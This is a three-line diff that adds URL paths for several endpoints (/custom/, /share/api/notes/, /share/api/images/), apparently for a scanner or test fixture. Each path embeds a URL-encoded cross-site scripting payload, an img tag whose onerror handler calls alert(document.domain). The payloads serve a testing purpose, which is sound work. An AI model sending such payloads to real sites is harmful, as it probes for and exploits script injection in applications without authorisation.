@@ -1,0 +1,3 @@
+/custom/%3Cimg%20src=x%20onerror=alert(document.domain)%3E
+/share/api/notes/%3Cimg%20src=x%20onerror=alert(document.domain)%3E
+/share/api/images/%3Cimg%20src=x%20onerror=alert(document.domain)%3E/filename
